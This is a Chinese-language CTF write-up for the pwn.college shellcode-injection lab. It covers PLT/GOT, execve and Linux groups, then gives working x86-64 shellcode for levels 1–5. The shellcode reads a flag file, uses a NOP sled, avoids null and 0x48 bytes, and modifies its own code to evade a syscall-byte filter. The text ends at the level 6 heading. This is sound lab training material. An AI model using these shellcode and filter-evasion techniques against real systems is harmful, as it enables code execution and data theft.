---
title: PWN-College-Shellcode-Injection-Writeup
date: 2024-07-09 11:02:00
author: 美食家李老叭
img: https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF 
categories: CTF
tags:
    - 逆向
---
# pwn.college Shellcode-Injection

https://pwn.college/program-security/shellcode-injection/

## 有价值的问题

### 1. PLT 和 GOT 有什么区别和联系

PLT(Procedure Linkage Table) 和 GOT（Global offset Table）是ELF(Executable and Linkable Format)文件中用于动态链接的重要机制。他们协同工作来实现动态库函数的调用。

PLT(Procedure Linkage Table)
- 位置：PLT位于可执行文件的代码段(.text段)中。
- 结构：PLT包含一系列跳转指令，这些指令在程序首次调用某个外部函数时，会跳转到一个存根stub代码，然后由动态链接器解析实际地址并修正跳转目标。
- 功能：延时绑定，PLT实现了延时绑定，即在程序运行时，只有在函数被第一次调用时，才会解析函数地址并跳转目标。PLT中的每个条目都是一个间接跳转，通过跳转到GOT中存储的地址来实现函数调用。

GOT(Global Offset Table)
- 位置：GOT位于可执行文件的数据段(.data段或.got段)中。
- 结构：GOT包含指向全局变量和外部函数地址的指针。在动态链接过程中，这些指针会被更新为实际的地址。
- 地址存储，GOT存储了外部函数和全局变量的实际地址，供程序在运行时使用。
- 动态链接：在程序加载时，动态链接器会解析并填充GOT表项。使得程序可以正确调用动态库中的函数和访问全局变量。


```c++
程序调用 -> PLT 条目 -> GOT 表项 -> 动态链接器 (第一次) -> 解析并更新 GOT/PLT -> 实际函数
          -> PLT 条目 -> GOT 表项 -> 实际函数 (后续)

GOT显示
./babyshell_level1:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000003d40 R_X86_64_RELATIVE  *ABS*+0x00000000000012e0
0000000000003d48 R_X86_64_RELATIVE  *ABS*+0x00000000000012a0
0000000000004008 R_X86_64_RELATIVE  *ABS*+0x0000000000004008
0000000000003fd8 R_X86_64_GLOB_DAT  _ITM_deregisterTMCloneTable
0000000000003fe0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
0000000000003fe8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000003ff0 R_X86_64_GLOB_DAT  _ITM_registerTMCloneTable
0000000000003ff8 R_X86_64_GLOB_DAT  __cxa_finalize@GLIBC_2.2.5
0000000000004010 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000004020 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000003f68 R_X86_64_JUMP_SLOT  putchar@GLIBC_2.2.5
0000000000003f70 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000003f78 R_X86_64_JUMP_SLOT  cs_free
0000000000003f80 R_X86_64_JUMP_SLOT  strlen@GLIBC_2.2.5
0000000000003f88 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000003f90 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000003f98 R_X86_64_JUMP_SLOT  __assert_fail@GLIBC_2.2.5
0000000000003fa0 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000003fa8 R_X86_64_JUMP_SLOT  close@GLIBC_2.2.5
0000000000003fb0 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000003fb8 R_X86_64_JUMP_SLOT  cs_disasm
0000000000003fc0 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000003fc8 R_X86_64_JUMP_SLOT  cs_open
0000000000003fd0 R_X86_64_JUMP_SLOT  cs_close


PLT显示

babyshell_level1:     file format elf64-x86-64
Disassembly of section .plt:
0000000000001020 <.plt>:
    1020:       ff 35 32 2f 00 00       pushq  0x2f32(%rip)        # 3f58 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:       f2 ff 25 33 2f 00 00    bnd jmpq *0x2f33(%rip)        # 3f60 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:       0f 1f 00                nopl   (%rax)
    1030:       f3 0f 1e fa             endbr64 
    1034:       68 00 00 00 00          pushq  $0x0
    1039:       f2 e9 e1 ff ff ff       bnd jmpq 1020 <.plt>
    103f:       90                      nop
    1040:       f3 0f 1e fa             endbr64 
    1044:       68 01 00 00 00          pushq  $0x1
    1049:       f2 e9 d1 ff ff ff       bnd jmpq 1020 <.plt>
    104f:       90                      nop
    1050:       f3 0f 1e fa             endbr64 
    1054:       68 02 00 00 00          pushq  $0x2

```


### 2. 为什么要同时设计PLT和GOT表项
设计 PLT（Procedure Linkage Table）和 GOT（Global Offset Table）的目的是为了实现动态链接的高效和灵活。虽然理论上可以只用 PLT 来实现动态链接，但分开设计 PLT 和 GOT 有多个好处，下面解释其中的原因。

动态链接的基本目标
- 延迟绑定（Lazy Binding）：在程序执行过程中，只在函数被首次调用时才解析其地址，减少启动时间。
- 位置无关代码（Position-Independent Code, PIC）：使得程序或共享库可以在内存中任意位置加载，提高内存利用率和安全性。
- 降低开销：减少每次调用动态函数时的性能开销。

为什么分开设计 PLT 和 GOT

1. 分离代码和数据：
    PLT：位于代码段，包含跳转指令和间接跳转表的索引。
    GOT：位于数据段，包含实际函数和变量地址。
    分离使得代码段可以保持只读，有助于提高安全性（如防止代码段被修改）。
2. 延迟绑定实现：
    首次调用：通过 PLT 条目跳转到 GOT 中的动态链接器解析函数。
    解析后：动态链接器更新 GOT 表项，指向实际函数地址。之后的调用直接通过 GOT 跳转到实际函数地址，减少开销。
    这种机制使得每个动态函数的地址只在第一次调用时解析一次，之后调用的开销很低。
3. 位置无关代码支持：
    GOT 表项：在加载时由动态链接器填充，提供实际地址，使得代码可以在任意位置加载。
    PLT 表项：通过相对地址引用 GOT 表项，实现位置无关。
4. 简化动态链接器实现：
    动态链接器可以集中管理 GOT 表项，解析并填充实际地址。
    更新 PLT 表项和 GOT 表项可以分别处理，简化动态链接器的逻辑。
5. 提高效率：
    运行时性能：首次调用动态函数时，通过 PLT 跳转到动态链接器处理，之后通过 GOT 直接跳转到函数地址，减少每次调用的性能开销。
    内存使用：数据段中的 GOT 可以在程序运行时动态修改，而代码段中的 PLT 可以保持只读，提高内存保护的有效性。

- PLT 和 GOT 的协同工作机制
    - PLT 条目：存储间接跳转指令，通过 GOT 表项获取实际函数地址。
    - GOT 表项：初始指向动态链接器解析函数，解析后指向实际函数地址。

```text
示例：调用 printf 函数的流程
1. 初始状态：
    PLT 表项指向 GOT 表项。
    GOT 表项指向动态链接器解析函数。
2. 第一次调用：
    调用 PLT 条目，跳转到 GOT 表项。
    GOT 表项指向动态链接器，解析 printf 的实际地址。
    动态链接器更新 GOT 表项，指向 printf 的实际地址。
3. 后续调用：
    PLT 通过 GOT 表项直接跳转到 printf 的实际地址。
```

- 总结
PLT 和 GOT 分开设计的主要原因是为了实现高效、灵活和安全的动态链接机制。通过分离代码和数据、支持延迟绑定和位置无关代码，PLT 和 GOT 提供了一种有效的动态链接解决方案。虽然理论上可以只用 PLT，但分开设计带来了更好的性能和安全性。


### 3. nasm在编译汇编语言的时候，会把汇编代码中各个段放在二进制的什么位置？

在使用 NASM 编译汇编代码时，汇编器会将各个段（section）放置在目标文件中的不同位置。具体位置取决于目标文件格式，例如二进制文件、ELF 文件或其他格式。以下是几种常见目标文件格式及其段的放置位置和排列方式：

1. 二进制文件格式（-f bin）
二进制文件格式是最简单的格式，所有段都直接放在输出文件中，没有额外的头信息。

.text 段：通常放在文件的起始位置。
.data 段：紧随 .text 段之后。
.bss 段：紧随 .data 段之后，但由于 .bss 段不包含初始化数据，通常在二进制文件中没有对应的部分，而是留出相应的空间。

```diff
+-------------------+
| .text 段 (代码)   |
+-------------------+
| .data 段 (已初始化数据) |
+-------------------+
```

2. ELF 文件格式（-f elf64）
ELF（Executable and Linkable Format）文件格式用于更复杂的可执行文件和共享库，包含详细的段信息和符号表。

.text 段：放在文件的代码段，包含可执行代码。
.data 段：放在文件的数据段，包含已初始化的数据。
.bss 段：放在文件的未初始化数据段，在运行时初始化为零。

```diff
+-------------------+
| ELF 文件头        |
+-------------------+
| 程序头表         |
+-------------------+
| .text 段 (代码)   |
+-------------------+
| .data 段 (已初始化数据) |
+-------------------+
| .bss 段 (未初始化数据)  |
+-------------------+
| 段头表           |
+-------------------+
```

### 4. 关于execve函数

execve 函数是一个系统调用，它用于在当前进程中执行一个新的程序。这个函数的声明通常在头文件 <unistd.h> 中，并且它是执行程序的最底层的接口之一。与其他 exec 系列函数不同，execve 允许直接指定要执行的程序文件路径、参数列表和环境变量列表。

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```
参数
- pathname：这是一个指向要执行的程序文件路径的指针。可以是绝对路径或相对路径。
- argv：这是一个指向字符串数组的指针，这些字符串是传递给新程序的参数列表。数组的最后一个元素必须是 NULL 指针，以标识参数列表的结束。
- envp：这是一个指向字符串数组的指针，这些字符串是新程序的环境变量。数组的最后一个元素也必须是 NULL 指针，以标识环境变量列表的结束。

返回值
- 成功：execve 函数没有返回值。如果执行成功，新的程序将替换当前进程的地址空间，原程序的代码将不会继续执行。
- 失败：返回 -1，并设置 errno 来指示错误类型。


**解释**
类似将执行代码替换成了新程序的代码，其他的都没变。

当 execve 成功执行时，当前进程的地址空间、堆栈、堆等都会被新程序替换。新程序从它的入口点开始执行，通常是 main 函数。当前进程的 PID 和打开的文件描述符等保持不变。execve 成功执行时，新程序会继承当前进程的权限和某些属性。具体来说，新进程继承的属性包括：

1. 进程ID（PID）和父进程ID（PPID）：新程序继承当前进程的PID和PPID，因此它在系统中的位置和关系保持不变。
2. 用户和组ID：新程序继承当前进程的有效用户ID（EUID）、有效组ID（EGID）、真实用户ID（RUID）和真实组ID（RGID），这意味着它具有与当前进程相同的权限。
3. 文件描述符：当前进程中打开的文件描述符会被继承，包括标准输入、标准输出和标准错误。如果文件描述符没有被标记为在执行新程序时关闭（即没有设置FD_CLOEXEC标志），它们会保持打开状态。
4. 环境变量：execve传递的环境变量列表会被新程序继承。虽然可以通过参数传递一个新的环境变量列表，但如果传递的是当前环境变量列表，新程序将继承这些环境变量。
5. 当前工作目录：新程序继承当前进程的工作目录。
6. 资源限制：当前进程的资源限制（如CPU时间限制、文件大小限制等）会被新程序继承。
7. 信号处理：新程序继承当前进程的信号屏蔽字，但信号处理程序将被重置为默认值。
8. 进程组和会话：新程序继承当前进程所属的进程组和会话。


### 5. 为什么设计了进程还要设计线程

进程和线程是操作系统中两种基本的计算资源管理方式。它们各自有不同的特点和用途：

进程 (Process)
- 定义：进程是操作系统分配资源（如内存、文件句柄等）的基本单位。每个进程都有独立的地址空间，并且通常包含多个线程。
- 地址空间：每个进程有自己独立的地址空间，一个进程中的数据不能被另一个进程直接访问。
- 资源开销：进程的创建和切换需要较多的资源和时间，因为涉及到完整的环境（包括内存空间和系统资源）的设置和保存。
- 安全性：由于进程之间的地址空间是独立的，一个进程的崩溃不会直接影响到其他进程，提高了系统的稳定性和安全性。

线程 (Thread)
- 定义：线程是进程中的一个执行单元，是CPU调度和执行的基本单位。一个进程可以包含一个或多个线程，这些线程共享进程的- 资源（如内存、文件句柄等）。
- 地址空间：线程共享同一个进程的地址空间和资源，因此线程之间可以直接访问彼此的数据。
- 资源开销：线程的创建和切换所需的资源和时间比进程少，因为线程之间共享资源，不需要像进程那样进行完整的环境设置和保存。
- 性能：由于线程共享进程的资源，线程间通信比进程间通信更加高效。线程适合需要频繁切换和快速响应的任务。

为什么有了进程还要设计线程？
- 提高并发性：线程允许在同一个进程内同时执行多个任务，提高了程序的并发性和效率，特别是在多核处理器上，能够更充分地利用CPU资源。
- 降低开销：线程的创建和切换比进程更轻量，适合需要快速响应和频繁切换的场景，如实时系统和交互式应用。
- 简化开发：线程之间共享同一进程的内存和资源，使得在同一进程内进行数据共享和通信更加简单和高效。对于需要大量数据共享的应用，使用线程可以简化开发复杂性。
- 资源共享：由于线程共享同一进程的资源，多个线程可以方便地访问和操作同一数据结构和资源，适合于需要高效访问共享资源的应用。

总的来说，进程和线程各自有不同的应用场景和优势。进程提供了更高的隔离性和安全性，适合独立运行的任务；线程提供了更高的并发性和效率，适合需要快速响应和高效共享资源的任务。结合使用进程和线程，可以更好地满足不同类型应用的需求。


**进程的例子**
- 独立的应用程序：例如，一个浏览器和一个文本编辑器是两个独立的应用程序，它们分别运行在自己的进程中。浏览器的崩溃不会影响文本编辑器，反之亦然。
- 服务器进程：例如，一个Web服务器（如Apache或Nginx）运行在一个独立的进程中。它可以通过生成子进程来处理不同的客户端请求。

**线程的例子**
- 多任务处理：例如，一个文本编辑器在编辑文档的同时可以进行拼写检查和自动保存。这些任务可以在不同的线程中并行执行。
- 网络服务：例如，一个Web服务器可以为每个客户端请求分配一个线程，以便同时处理多个请求，提高响应速度。

### 6. Linux系统中组的含义

在Linux系统中，组（group）是用户的一种分类方式，用于管理用户的权限和访问控制。每个用户可以属于一个或多个组，进而影响该用户或进程对系统资源的访问权限。进程所属的组ID列表表示该进程的所有者用户所属的所有组ID。

**组ID的含义**
组ID（GID）：每个组都有一个唯一的组ID（GID）。组ID用于标识组，就像用户ID（UID）用于标识用户一样。

**Groups 字段的含义**
在 `/proc/[pid]/status` 文件中的 `Groups` 字段列出了进程所有者所属的所有组的组ID。这些组ID决定了进程在文件系统和系统资源访问权限方面的行为。例如，如果一个文件的组所有者与进程的组ID列表中的一个匹配，那么进程将使用文件的组权限进行访问。

示例分析:

假设你看到以下 Groups 字段：

Groups: 4 24 27 30 46 122 135 136 1000
这表示该进程的所有者用户属于以下组：
```
GID 4
GID 24
GID 27
GID 30
GID 46
GID 122
GID 135
GID 136
GID 1000
```
这些组ID对应的组名可以在 /etc/group 文件中找到。每行格式如下：group_name:x:GID:group_list

示例：查看组名
假设你有一个GID列表 4 24 27 30 46 122 135 136 1000，你想知道这些GID对应的组名，你可以查看 /etc/group 文件`cat /etc/group | grep -E ':(4|24|27|30|46|122|135|136|1000)`

示例输出可能如下：
```bash
adm:x:4:syslog,lebron
cdrom:x:24:lebron
sudo:x:27:lebron
dip:x:30:lebron
plugdev:x:46:lebron
lpadmin:x:122:lebron
sambashare:x:135:lebron
libvirt:x:136:lebron
lebron:x:1000:
```
这样你就可以确定GID对应的组名了：
```
GID 4: adm
GID 24: cdrom
GID 27: sudo
GID 30: dip
GID 46: plugdev
GID 122: lpadmin
GID 135: sambashare
GID 136: libvirt
GID 1000: lebron
```

这些组信息对进程的访问控制有直接影响。如果某个文件的组权限设置为读/写/执行，并且该文件的组所有者是 cdrom（GID 24），那么任何属于 cdrom 组的用户（如 lebron）都可以根据组权限访问该文件。同样，如果进程需要访问某些受限资源（如设备文件），它必须运行在合适的组权限下。

### 

## level1

这个题可以用nasm直接编译汇编语言，我居然还在用python，写汇编语言的二进制表示然后再写入文件中。因为我卡在了不知道把字符串应该放在哪里？到底是放在baby程序的栈中，还是放在我的代码的最后部分。其实是一致的，因为你所有的输入都在baby程序的栈中，只不过位置不同。

nasm编译汇编语言，居然可以指定段中的数据。而且这里使用的都是系统调用，不用再通过plt段获取一些动态链接函数的地址了。

利用程序
```asm
BITS 64

section .data
    filename db '/flag', 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start

_start:
    ; open("filename", O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY = 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall
```

## level2

这一关相较于上一关，在shellcode运行之前，程序随机跳过开始的0x800个字节。所以我们需要在程序开始之前的0x800个字节添加NOP指令。

```c
puts("Executing filter...\n");
puts("This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this");
puts("is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the");
puts("actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly");
puts("execute and then your real shellcode will run. This concept is called a `nop sled`.\n");
srand(time(NULL));
int to_skip = (rand() % 0x700) + 0x100;
shellcode_mem += to_skip;
shellcode_size -= to_skip;
```

利用代码
```asm
BITS 64

section .data
    filename db '/flag', 0    ; 文件路径需要替换为正确的路径

section .bss
    buffer resb 100                   ; 100 字节缓冲区

section .text
global _start


; 在 .text 段前插入 0x800 个 nop 指令
nop_space:
    times 0x800 nop           ; 0x800 个 nop 指令

_start:
    ; open("filename", O_RDONLY)
    xor rax, rax
    mov rax, 2                        ; SYS_open
    lea rdi, [rel filename]
    xor rsi, rsi                      ; O_RDONLY = 0
    syscall

    ; 检查 open 的返回值
    test rax, rax
    js error                          ; 如果打开文件失败，跳转到错误处理

    ; read(fd, buffer, 100)
    mov rdi, rax                      ; fd
    lea rsi, [rel buffer]
    mov rdx, 100                      ; 读取 100 字节
    xor rax, rax                      ; SYS_read
    syscall

    ; write(1, buffer, rax)
    mov rdi, 1                        ; stdout
    mov rdx, rax                      ; 读取的字节数
    mov rax, 1                        ; SYS_write
    syscall

    ; exit(0)
    xor rdi, rdi                      ; 返回码 0
    mov rax, 60                       ; SYS_exit
    syscall

error:
    ; exit(1)
    mov rdi, 1                        ; 返回码 1
    mov rax, 60                       ; SYS_exit
    syscall

```


## level3

这一关在运行shellcode之前，baby程序判断读取内容中是否包含0x00字节，如果包含则拒绝运行。

我们之前的汇编代码中，字符串地址的结尾、缓冲区初始化都是0x00字节。如果使用hexdump观察的话，还有很多地址也包含0x00。所以我们不能依据之前的代码解决此关。

我们可以利用execve函数，在汇编语言中调用这个函数，去启动我们编写的一个读取flag的程序。

execve函数

```asm
BITS 64

section .text
global _start

_start:
    jmp short call_shellcode

get_address:
    pop rdi                     ; 将字符串地址弹出到RDI中
    xor rsi, rsi                ; 清空RSI
    xor rdx, rdx                ; 清空RDX
    mov al, 0x3b                ; syscall编号execve
    syscall                     ; 执行系统调用

call_shellcode:
    call get_address            ; 调用get_address来获取字符串地址
    db '/home/hacker/Shellcode/level3/openflag'               ; 存储字符串/bin/sh，X是占位符，避免NULL字节

```

openflag

```c
#include<stdio.h>

int main(){
    char* filename = "/flag";
    int fd;
    fd = open(filename,0);
    char buffer[100];
    read(fd,buffer, 100);
    puts(buffer);
}
```

## level4

第4关，shellcode中不然包含0x48，然后我就替换了一下level3中的汇编。把xor指令换成mov指令了。

还是通过execve运行openflag程序。

```asm
BITS 64

section .text
global _start

_start:
    jmp short call_shellcode

get_address:
    pop rdi                     ; 将字符串地址弹出到RDI中
    mov rsi, 0                  ; 清空RSI
    mov rdx, 0                  ; 清空RDX
    mov al, 0x3b                ; syscall编号execve
    syscall                     ; 执行系统调用

call_shellcode:
    call get_address            ; 调用get_address来获取字符串地址
    db '/home/hacker/Shellcode/level3/openflag',0x0             ; 存储字符串/bin/sh，X是占位符，避免NULL字节

```



## level5

第五关shellcode中，不让包含syscall--0f05、sysenter--0f34、int--80cd这些字节。
但是存储代码的栈空间是可以修改，可以读写、可以运行的。所以我们的思路，可以通过在汇编运行运行的期间，动态修改后续需要执行的指令。

```asm


BITS 64

section .data
    filename db '/home/hacker/Shellcode/level3/openflag',0x0             ; 存储字符串/bin/sh，X是占位符，避免NULL字节

section .text
    global _start

_start:
    jmp short call_code

code:
    pop rsi                      ; 将下一条指令地址保存到 rsi 寄存器--times 0x10 nop的首地址
    push rsi
    mov byte [rsi-8], 0x0f        ; 将 0x0f 写入地址 rsi-8 # 这个地址的位置就是 call rax的地址
    mov byte [rsi-7], 0x05       ; 将 0x05 写入地址 rsi-7 
    xor rax, rax                 ; 清空 rax
    mov al, 0x3b                 ; 将 59 (sys_execve) 移动到 rax
    lea rdi, [rel filename]      ; 将字符串 filename 移动到 rdi
    xor rsi, rsi                 ; 清空 rsi
    xor rdx, rdx                 ; 清空 rdx
    call rax                     ; 前面的mov byte [rsi-8], 0x0f 和 mov byte [rsi-7], 会将0x05 这个地方修改为syscall 指令
    ret

call_code:
    call code                    ; 跳转到 code 标签并将返回地址压入栈
    times 0x10 nop               ; 0x10个 nop 指令
    


=> 0x1c121004:  movb   $0xf,-0x8(%rsi)
   0x1c121008:  movb   $0x5,-0x7(%rsi)
   0x1c12100c:  xor    %rax,%rax
   0x1c12100f:  mov    $0x3b,%al
   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038
   0x1c121018:  xor    %rsi,%rsi
   0x1c12101b:  xor    %rdx,%rdx
   0x1c12101e:  call   *%rax
   0x1c121020:  ret
   0x1c121021:  call   0x1c121002
   0x1c121026:  nop
   0x1c121027:  nop
   0x1c121028:  nop
   0x1c121029:  nop
   0x1c12102a:  nop
   0x1c12102b:  nop
   0x1c12102c:  nop

=> 0x1c12100c:  xor    %rax,%rax
   0x1c12100f:  mov    $0x3b,%al
   0x1c121011:  lea    0x20(%rip),%rdi        # 0x1c121038
   0x1c121018:  xor    %rsi,%rsi
   0x1c12101b:  xor    %rdx,%rdx
   0x1c12101e:  syscall
   0x1c121020:  ret
   0x1c121021:  call   0x1c121002
   0x1c121026:  nop
   0x1c121027:  nop
   0x1c121028:  nop
   0x1c121029:  nop
   0x1c12102a:  nop
   0x1c12102b:  nop
   0x1c12102c:  nop
   0x1c12102d:  nop

```


## level6